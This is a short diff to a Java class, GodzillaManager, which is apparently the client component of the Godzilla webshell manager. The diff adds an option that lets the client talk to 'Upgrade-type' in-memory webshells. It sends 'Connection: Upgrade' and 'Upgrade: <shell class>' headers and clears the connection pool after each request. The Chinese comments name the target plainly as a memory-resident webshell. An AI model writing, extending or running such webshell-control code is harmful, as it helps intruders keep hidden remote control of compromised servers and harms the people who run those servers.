@@ -88,6 +88,7 @@ public class GodzillaManager implements Closeable {
     private Request request;
     private boolean http;
     private boolean ws;
+    private String upgradeProtocol;
     private Map<String, String> headers = new HashMap<>();
 
     public static Pair<String, String> getKeyMd5(String key, String pass) {
@@ -220,6 +221,11 @@ public class GodzillaManager implements Closeable {
                 .url(this.entrypoint)
                 .post(requestBody)
                 .headers(Headers.of(this.headers));
+        if (upgradeProtocol != null) {
+            // Upgrade 响应返回后连接被容器接管并关闭，留在池里的旧连接不能再用于下一次请求
+            builder.header("Connection", "Upgrade").header("Upgrade", upgradeProtocol);
+            client.connectionPool().evictAll();
+        }
         return client.newCall(builder.build()).execute();
     }
 
@@ -306,6 +312,7 @@ public class GodzillaManager implements Closeable {
         private String entrypoint;
         private String key;
         private String pass;
+        private String upgradeProtocol;
 
         public GodzillaManagerBuilder entrypoint(String entrypoint) {
             this.entrypoint = entrypoint;
@@ -327,10 +334,20 @@ public class GodzillaManager implements Closeable {
             return this;
         }
 
+        /**
+         * Upgrade 型内存马：请求带 {@code Connection: Upgrade} / {@code Upgrade: <protocol>}，
+         * protocol 为 shell 类名。
+         */
+        public GodzillaManagerBuilder upgradeProtocol(String upgradeProtocol) {
+            this.upgradeProtocol = upgradeProtocol;
+            return this;
+        }
+
         public GodzillaManager build() {
             GodzillaManager manager = new GodzillaManager();
             manager.setEntrypoint(entrypoint);
             manager.setPass(pass);
+            manager.setUpgradeProtocol(upgradeProtocol);
             Pair<String, String> keyMd5 = getKeyMd5(key, pass);
             manager.setKey(keyMd5.getLeft());
             manager.setMd5(keyMd5.getRight());
